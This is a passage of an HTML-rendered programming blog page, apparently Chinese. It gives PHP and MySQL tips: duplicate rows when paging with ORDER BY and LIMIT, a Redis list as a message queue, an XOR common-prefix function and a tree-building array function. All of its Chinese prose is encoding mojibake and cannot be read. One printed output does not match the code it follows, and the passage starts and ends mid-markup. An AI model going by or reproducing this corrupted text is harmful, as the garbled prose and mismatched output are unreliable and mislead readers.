class="string">'publish'</span> ORDER BY view_count desc LIMIT <span class="number">5</span>,<span class="number">5</span></span><br><span class="line">ä½¿ç”¨ä¸Šè¿°SQLæŸ¥è¯¢çš„æ—¶å€™ï¼Œå¾ˆæœ‰å¯èƒ½å‡ºç°å’ŒLIMIT <span class="number">0</span>,<span class="number">5</span>ç›¸åŒçš„æŸæ¡è®°å½•ï¼Œè€Œå¦‚æœä½¿ç”¨ï¼š</span><br><span class="line"></span><br><span class="line">SELECT * FROM post WHERE <span class="string">`post_status`</span>=<span class="string">'publish'</span> ORDER BY view_count desc LIMIT <span class="number">5</span>,<span class="number">5</span></span><br><span class="line">åˆ™ä¸ä¼šå‡ºç°é‡å¤çš„æƒ…å†µã€‚ä½†æ˜¯ï¼Œç”±äºpostè¡¨çš„å­—æ®µå¾ˆå¤šï¼Œæˆ‘ä»…ä»…å¸Œæœ›ç”¨è¿™ä¸¤ä¸ªå­—æ®µï¼Œä¸æƒ³æŠŠpost_contentä¹ŸæŸ¥å‡ºæ¥ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªæƒ…å†µï¼Œæˆ‘åœ¨ORDER BYåé¢ä½¿ç”¨äº†ä¸¤ä¸ªæ’åºæ¡ä»¶æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</span><br><span class="line"></span><br><span class="line">SELECT <span class="string">`post_title`</span>,<span class="string">`post_date`</span> FROM post WHERE <span class="string">`post_status`</span>=<span class="string">'publish'</span> ORDER BY view_count desc,ID asc LIMIT <span class="number">5</span>,<span class="number">5</span></span><br><span class="line">æŒ‰ç†æ¥è¯´ï¼Œmysqlçš„æ’åºé»˜è®¤æƒ…å†µä¸‹æ˜¯ä»¥ä¸»é”®IDä½œä¸ºæ’åºæ¡ä»¶çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœåœ¨view_countç›¸ç­‰çš„æƒ…å†µä¸‹ï¼Œä¸»é”®IDä½œä¸ºé»˜è®¤çš„æ’åºæ¡ä»¶ï¼Œä¸éœ€è¦æˆ‘ä»¬å¤šæ­¤ä¸€ä¸¾åŠ ID ascã€‚ä½†æ˜¯äº‹å®å°±æ˜¯ï¼Œmysqlå†order byå’Œlimitæ··ç”¨çš„æ—¶å€™ï¼Œå‡ºç°äº†æ’åºçš„æ··ä¹±æƒ…å†µã€‚å…¶åçš„æœºç†æˆ‘å°šä¸å¾—è€ŒçŸ¥ï¼Œåœ¨é˜…è¯»è¿™ç¯‡æ–‡ç« åï¼Œå¥½åƒæœ‰æ‰€é¢†æ‚Ÿï¼Œä¸‹é¢åšä¸€ä¸‹çŒœæµ‹ã€‚</span><br><span class="line"></span><br><span class="line">è¿™ç¯‡æ–‡ç« çš„è§£é‡Šæ˜¯ï¼šhttps:<span class="comment">//www.tangshuang.net/1827.html</span></span><br><span class="line"></span><br><span class="line">åœ¨MySQL <span class="number">5.6</span>çš„ç‰ˆæœ¬ä¸Šï¼Œä¼˜åŒ–å™¨åœ¨é‡åˆ°order by limitè¯­å¥çš„æ—¶å€™ï¼Œåšäº†ä¸€ä¸ªä¼˜åŒ–ï¼Œå³ä½¿ç”¨äº†priority queueã€‚â€¦â€¦</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨ priority queue çš„ç›®çš„ï¼Œå°±æ˜¯åœ¨ä¸èƒ½ä½¿ç”¨ç´¢å¼•æœ‰åºæ€§çš„æ—¶å€™ï¼Œå¦‚æœè¦æ’åºï¼Œå¹¶ä¸”ä½¿ç”¨äº†limit nï¼Œé‚£ä¹ˆåªéœ€è¦åœ¨æ’åºçš„è¿‡ç¨‹ä¸­ï¼Œä¿ç•™næ¡è®°å½•å³å¯ï¼Œè¿™æ ·è™½ç„¶ä¸èƒ½è§£å†³æ‰€æœ‰è®°å½•éƒ½éœ€è¦æ’åºçš„å¼€é”€ï¼Œä½†æ˜¯åªéœ€è¦ sort buffer å°‘é‡çš„å†…å­˜å°±å¯ä»¥å®Œæˆæ’åºã€‚</span><br><span class="line"></span><br><span class="line">ä¹‹æ‰€ä»¥<span class="number">5.6</span>å‡ºç°äº†ç¬¬äºŒé¡µæ•°æ®é‡å¤çš„é—®é¢˜ï¼Œæ˜¯å› ä¸º priority queue ä½¿ç”¨äº†å †æ’åºçš„æ’åºæ–¹æ³•ï¼Œè€Œå †æ’åºæ˜¯ä¸€ä¸ªä¸ç¨³å®šçš„æ’åºæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ç›¸åŒçš„å€¼å¯èƒ½æ’åºå‡ºæ¥çš„ç»“æœå’Œè¯»å‡ºæ¥çš„æ•°æ®é¡ºåºä¸ä¸€è‡´ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">5.5</span> æ²¡æœ‰è¿™ä¸ªä¼˜åŒ–ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ã€‚</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´ï¼Œmysql5<span class="number">.5</span>æ˜¯ä¸å­˜åœ¨æœ¬æ–‡æåˆ°çš„é—®é¢˜çš„ï¼Œ<span class="number">5.6</span>ç‰ˆæœ¬ä¹‹åæ‰å‡ºç°äº†è¿™ç§æƒ…å†µã€‚</span><br><span class="line"></span><br><span class="line">æˆ‘ä»¬å†çœ‹ä¸‹mysqlè§£é‡Šsqlè¯­è¨€æ—¶çš„æ‰§è¡Œé¡ºåºï¼š</span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>) SELECT </span><br><span class="line">(<span class="number">8</span>) DISTINCT &lt;select_list&gt;</span><br><span class="line">(<span class="number">1</span>) FROM &lt;left_table&gt;</span><br><span class="line">(<span class="number">3</span>) &lt;join_type&gt; JOIN &lt;right_table&gt;</span><br><span class="line">(<span class="number">2</span>) ON &lt;join_condition&gt;</span><br><span class="line">(<span class="number">4</span>) WHERE &lt;where_condition&gt;</span><br><span class="line">(<span class="number">5</span>) GROUP BY &lt;group_by_list&gt;</span><br><span class="line">(<span class="number">6</span>) HAVING &lt;having_condition&gt;</span><br><span class="line">(<span class="number">9</span>) ORDER BY &lt;order_by_condition&gt;</span><br><span class="line">(<span class="number">10</span>) LIMIT &lt;limit_number&gt;</span><br><span class="line">åœ¨æˆ‘ä»¬æœ¬æ–‡çš„æ¡ˆä¾‹sqlä¸­ï¼Œæ‰§è¡Œé¡ºåºä¾æ¬¡ä¸ºform... where... select... order by... limit...</span><br><span class="line"></span><br><span class="line">ç”±äºä¸Šè¿°priority queueçš„åŸå› ï¼Œåœ¨å®Œæˆselectä¹‹åï¼Œæ‰€æœ‰è®°å½•æ˜¯ä»¥å †æ’åºçš„æ–¹æ³•æ’åˆ—çš„ï¼Œåœ¨è¿›è¡Œorder byæ—¶ï¼Œä»…æŠŠview_countå€¼å¤§çš„å¾€å‰ç§»åŠ¨ã€‚ä½†ç”±äºlimitçš„å› ç´ ï¼Œæ’åºè¿‡ç¨‹ä¸­åªéœ€è¦ä¿ç•™åˆ°<span class="number">5</span>æ¡è®°å½•å³å¯ï¼Œview_countå¹¶ä¸å…·å¤‡ç´¢å¼•æœ‰åºæ€§ï¼Œæ‰€ä»¥å½“ç¬¬äºŒé¡µæ•°æ®è¦å±•ç¤ºæ—¶ï¼Œmysqlè§åˆ°å“ªä¸€æ¡å°±æ‹¿å“ªä¸€æ¡ï¼Œå› æ­¤ï¼Œå½“æ’åºå€¼ç›¸åŒçš„æ—¶å€™ï¼Œç¬¬ä¸€æ¬¡æ’åºæ˜¯éšæ„æ’çš„ï¼Œç¬¬äºŒæ¬¡å†æ‰§è¡Œè¯¥sqlçš„æ—¶å€™ï¼Œå…¶ç»“æœåº”è¯¥å’Œç¬¬ä¸€æ¬¡ç»“æœä¸€æ ·ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="æ¶ˆæ¯é˜Ÿåˆ—å¤„ç†é«˜å¹¶å‘"><a href="#æ¶ˆæ¯é˜Ÿåˆ—å¤„ç†é«˜å¹¶å‘" class="headerlink" title="æ¶ˆæ¯é˜Ÿåˆ—å¤„ç†é«˜å¹¶å‘"></a>æ¶ˆæ¯é˜Ÿåˆ—å¤„ç†é«˜å¹¶å‘</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">å½“ç”¨æˆ·ç‚¹å‡»æŒ‰é’®æäº¤è´­ä¹°è¯·æ±‚æ—¶ï¼Œå¹¶ä¸ç›´æ¥é©¬ä¸Šæ‰§è¡Œè´­ä¹°è¯·æ±‚åŠ¨ä½œï¼Œè€Œæ˜¯å°†è¯·æ±‚åŠ¨ä½œå­˜å…¥æ¶ˆæ¯åˆ—é˜Ÿï¼Œç”¨æˆ·çš„è¯·æ±‚åˆ°æ­¤ç»“æŸï¼Œè€Œåœ¨æœåŠ¡å™¨åå°ï¼Œä»æ¶ˆæ¯åˆ—é˜Ÿä¸­é€ä¸€å–å‡ºè¯·æ±‚è®°å½•ï¼Œå†è¿›è¡Œæ•°æ®åº“æ“ä½œï¼Œå®Œæˆå¤„ç†ä¹‹åï¼Œå°†å¤„ç†ç»“æœè¿”å›ç»™ç”¨æˆ·ã€‚ç”±äºæ¶ˆæ¯é˜Ÿåˆ—çš„å­˜å–æ˜¯å…ˆè¿›å…ˆå‡ºï¼ˆå’Œæ ˆç›¸åï¼‰ï¼Œå› æ­¤ï¼Œæ‰€æœ‰å¤„ç†å°†æŒ‰è¯·æ±‚é¡ºåºè¿›è¡Œå¤„ç†ã€‚ç”±äºå¤„ç†æ˜¯åœ¨åå°ä¸€ä¸ªä¸€ä¸ªå®Œæˆï¼Œå› æ­¤ä¸ä¼šå¯¹æœåŠ¡å™¨å’Œæ•°æ®åº“é€ æˆå·¨å¤§å‹åŠ›ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>,<span class="number">6379</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  $redis-&gt;LPUSH(<span class="string">'click'</span>,$user_id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(Exception $e) &#123;</span><br><span class="line">  echo $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;pconnect(<span class="string">'127.0.0.1'</span>,<span class="number">6379</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    $value = $redis-&gt;LPOP(<span class="string">'click'</span>);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">      åˆ©ç”¨$valueè¿›è¡Œé€»è¾‘å’Œæ•°æ®å¤„ç†</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span>(Exception $e) &#123;</span><br><span class="line">    echo $e-&gt;getMessage();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è·å–è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²å‰é¢çš„ç›¸åŒéƒ¨åˆ†"><a href="#è·å–è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²å‰é¢çš„ç›¸åŒéƒ¨åˆ†" class="headerlink" title="è·å–è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²å‰é¢çš„ç›¸åŒéƒ¨åˆ†"></a>è·å–è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²å‰é¢çš„ç›¸åŒéƒ¨åˆ†</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">å¼‚æˆ–è¿ç®—æ˜¯ä¸€ç§éå¸¸ç‰¹æ®Šçš„è¿ç®—ï¼Œç®€å•çš„è¯´å°±æ˜¯â€œå¦‚æœä¸¤ä¸ªå€¼ç›¸åŒï¼Œè¿”å›<span class="number">0</span>|<span class="literal">false</span>ï¼Œå¦‚æœä¸¤ä¸ªå€¼ä¸åŒï¼Œåˆ™è¿”å›<span class="number">1</span>|<span class="literal">true</span>â€ã€‚</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">samestrin</span>(<span class="params">$str1, $str2</span>) </span>&#123;</span><br><span class="line">  $pos = strspn($str1 ^ $str2, <span class="string">"\0"</span>);</span><br><span class="line">  <span class="keyword">if</span>($pos) &#123;</span><br><span class="line">    <span class="keyword">return</span> substr($str1, <span class="number">0</span>, $pos);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;https:<span class="comment">//www.tangshuang.net/82.html</span></span><br><span class="line">ä¸Šè¿°ä»£ç ä¸­ï¼Œå…³é”®éƒ¨åˆ†å·²ç»ç”¨çº¢è‰²è¡¨ç¤ºå‡ºæ¥äº†ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå½“ä½ å¯¹ä¸¤ä¸ªå­—ç¬¦ä¸²è¿›è¡Œå¼‚æˆ–æ“ä½œçš„æ—¶å€™ï¼Œç›¸åŒçš„å­—ç¬¦çš„å¼‚æˆ–ç»“æœæ˜¯<span class="literal">null</span>(â€œ\<span class="number">0</span>â€)ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦æ‰¾å‡ºç¬¬ä¸€ä¸ªé<span class="literal">null</span>(â€œ\<span class="number">0</span>â€)å­—ç¬¦å°±å¯ä»¥äº†ã€‚å¦‚æ­¤ä¼˜é›…çš„æ“ä½œï¼Œå¾—ç›Šäºè®¡ç®—æœºé¢†åŸŸçš„å¼‚æˆ–è¿ç®—ï¼Œå¦‚è‹¥æ²¡æœ‰è¿™ç§ç®—æ³•ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å†™ä¸€å¤§å †ä»£ç æ¥è¿›è¡ŒåŒ¹é…å¯¹æ¯”ã€‚</span><br><span class="line"> samestrin(<span class="string">'ab'</span>,<span class="string">'abd'</span>)</span><br><span class="line">=&gt; <span class="string">"ab"</span></span><br></pre></td></tr></table></figure>
<h3 id="æ ‘å½¢ç»“æ„ç®—æ³•"><a href="#æ ‘å½¢ç»“æ„ç®—æ³•" class="headerlink" title="æ ‘å½¢ç»“æ„ç®—æ³•"></a>æ ‘å½¢ç»“æ„ç®—æ³•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ„å»ºå±‚çº§ï¼ˆæ ‘çŠ¶ï¼‰æ•°ç»„</span></span><br><span class="line"><span class="comment"> * @param array $array è¦è¿›è¡Œå¤„ç†çš„ä¸€ç»´æ•°ç»„ï¼Œç»è¿‡è¯¥å‡½æ•°å¤„ç†åï¼Œè¯¥æ•°ç»„è‡ªåŠ¨è½¬ä¸ºæ ‘çŠ¶æ•°ç»„</span></span><br><span class="line"><span class="comment"> * @param string $pid çˆ¶çº§IDçš„å­—æ®µå</span></span><br><span class="line"><span class="comment"> * @return array|bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">array_tree</span>(<span class="params">&amp;$array, $pid = <span class="string">'pid'</span></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// å­å…ƒç´ è®¡æ•°å™¨</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">array_children_count</span>(<span class="params">$array,$pid</span>) </span>&#123;</span><br><span class="line">    $counter = array();</span><br><span class="line">    foreach($array <span class="keyword">as</span> $item) &#123;</span><br><span class="line">      $count = isset($counter[$item[$pid]]) ? $counter[$item[$pid]] : <span class="number">0</span>;</span><br><span class="line">      $count ++;</span><br><span class="line">      $counter[$item[$pid]] = $count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $counter;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æŠŠå…ƒç´ æ’å…¥åˆ°å¯¹åº”çš„çˆ¶å…ƒç´ childrenå­—æ®µ</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">array_child_append</span>(<span class="params">$parent,$pid,$child</span>) </span>&#123;</span><br><span class="line">    foreach($parent <span class="keyword">as</span> &amp;$item) &#123;</span><br><span class="line">      <span class="keyword">if</span>($item[<span class="string">'id'</span>] == $pid) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!isset($item[<span class="string">'children'</span>])) $item[<span class="string">'children'</span>] = array();</span><br><span class="line">        $item[<span class="string">'children'</span>][] = $child;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $parent;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// å¼€å§‹ç¨‹åº</span></span><br><span class="line">  $counter = array_children_count($array,$pid);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¦‚æœé¡¶çº§å…ƒç´ ä¸º0ä¸ªï¼Œé‚£ä¹ˆç›´æ¥è¿”å›false</span></span><br><span class="line">  <span class="keyword">if</span>($counter[<span class="number">0</span>] == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å‡†å¤‡é¡¶çº§å…ƒç´ </span></span><br><span class="line">  $tree = array();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä½ç§»</span></span><br><span class="line">  <span class="keyword">while</span>(isset($counter[<span class="number">0</span>]) &amp;&amp; $counter[<span class="number">0</span>] &gt; <span class="number">0</span>) &#123; <span class="comment">// å¦‚æœé¡¶çº§æ ç›®çš„å­å…ƒç´ è®¡æ•°å™¨ä»ç„¶å¤§äº0ï¼Œé‚£ä¹ˆä»ç„¶å¾€ä¸‹æ‰§è¡Œå¾ªç¯</span></span><br><span class="line">    $temp = array_shift($array);</span><br><span class="line">    <span class="keyword">if</span>(isset($counter[$temp[<span class="string">'id'</span>]]) &amp;&amp; $counter[$temp[<span class="string">'id'</span>]] &gt; <span class="number">0</span>) &#123; <span class="comment">// å¦‚æœæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å­å…ƒç´ ä¸ªæ•°å¤§äº0ï¼Œé‚£ä¹ˆæŠŠè¯¥å…ƒç´ æ”¾ç½®åˆ°æ•°ç»„çš„æœ«ç«¯</span></span><br><span class="line">      array_push($array,$temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">// ç›¸åï¼Œå¦‚æœè¯¥æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ²¡æœ‰å­å…ƒç´ ï¼Œé‚£ä¹ˆæŠŠè¯¥å…ƒç´ ç§»åŠ¨åˆ°å…¶çˆ¶å…ƒç´ çš„childrenå­—æ®µä¸­ï¼ŒåŒæ—¶ï¼Œè¯¥å…ƒç´ ä»åŸæ•°ç»„ä¸­è¢«åˆ é™¤</span></span><br><span class="line">      <span class="keyword">if</span>($temp[$pid] == <span class="number">0</span>)</span><br><span class="line">        $tree[] = $temp;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        $array = array_child_append($array,$temp[$pid],$temp);</span><br><span class="line">    &#125;</span><br><span class="line">    $counter = array_children_count($array,$pid);</span><br><span class="line">  &#125;</span><br><span class="line">  $array = $tree;</span><br><span class="line">  <span class="keyword">return</span> $tree;</span><br><span class="line">&#125;</span><br><span class="line">$arr = array(</span><br><span class="line">  array(<span class="string">'id'</span> =&gt; <span class="number">53</span>,<span class="string">'pid'</span> =&gt; <span class="number">0</span>),</span><br><span class="line">  array(<span class="string">'id'</span> =&gt; <span class="number">64</span>,<span class="string">'pid'</span> =&gt; <span class="number">53</span>),</span><br><span class="line">  array(<span class="string">'id'</span> =&gt; <span class="number">70</span>,<span class="string">'pid'</span> =&gt; <span class="number">42</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment">//$r=array_tree($arr,'pid');print_r($r);</span></span><br><span class="line"></span><br><span class="line">$demo1 = array(</span><br><span class="line">  <span class="number">1</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">1</span>,<span class="string">'title'</span> =&gt; <span class="string">'title1'</span>,<span class="string">'pid'</span> =&gt; <span class="number">0</span>),</span><br><span class="line">  <span class="number">2</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">2</span>,<span class="string">'title'</span> =&gt; <span class="string">'title2'</span>,<span class="string">'pid'</span> =&gt; <span class="number">1</span>),</span><br><span class="line">  <span class="number">3</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">3</span>,<span class="string">'title'</span> =&gt; <span class="string">'title3'</span>,<span class="string">'pid'</span> =&gt; <span class="number">1</span>),</span><br><span class="line">  <span class="number">4</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">4</span>,<span class="string">'title'</span> =&gt; <span class="string">'title4'</span>,<span class="string">'pid'</span> =&gt; <span class="number">2</span>),</span><br><span class="line">  <span class="number">5</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">5</span>,<span class="string">'title'</span> =&gt; <span class="string">'title5'</span>,<span class="string">'pid'</span> =&gt; <span class="number">2</span>),</span><br><span class="line">  <span class="number">6</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">6</span>,<span class="string">'title'</span> =&gt; <span class="string">'title6'</span>,<span class="string">'pid'</span> =&gt; <span class="number">0</span>)</span><br><span class="line">);</span><br><span class="line">$demo1 = array_tree($demo1);<span class="comment">// æˆ–è€…ç›´æ¥ä½¿ç”¨array_tree($demo1);ï¼Œæ— éœ€è¿”å›å€¼https://www.tangshuang.net/2073.html https://3v4l.org/kngT8</span></span><br><span class="line">print_r($demo1);</span><br><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; Nance</span><br><span class="line">            [age] =&gt; <span class="number">21</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; Kenvi</span><br><span class="line">            [age] =&gt; <span class="number">18</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; <span class="number">6</span></span><br><span class="line">            [title] =&gt; title6</span><br><span class="line">            [pid] =&gt; <span class="number">0</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; <span class="number">1</span></span><br><span class="line">            [title] =&gt; title1</span><br><span class="line">            [pid] =&gt; <span class="number">0</span></span><br><span class="line">            [children] =&gt; <span class="built_in">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [id] =&gt; <span class="number">3</span></span><br><span class="line">                            [title] =&gt; title3</span><br><span class="line">                            [pid] =&gt; <span class="number">1</span></span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [id] =&gt; <span class="number">2</span></span><br><span class="line">                            [title] =&gt; title2</span><br><span class="line">                            [pid] =&gt; <span class="number">1</span></span><br><span class="line">                            [children] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                (</span><br><span class="line">                                    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [id] =&gt; <span class="number">4</span></span><br><span class="line">                                            [title] =&gt; title4</span><br><span class="line">                                            [pid] =&gt; <span class="number">2</span></span><br><span 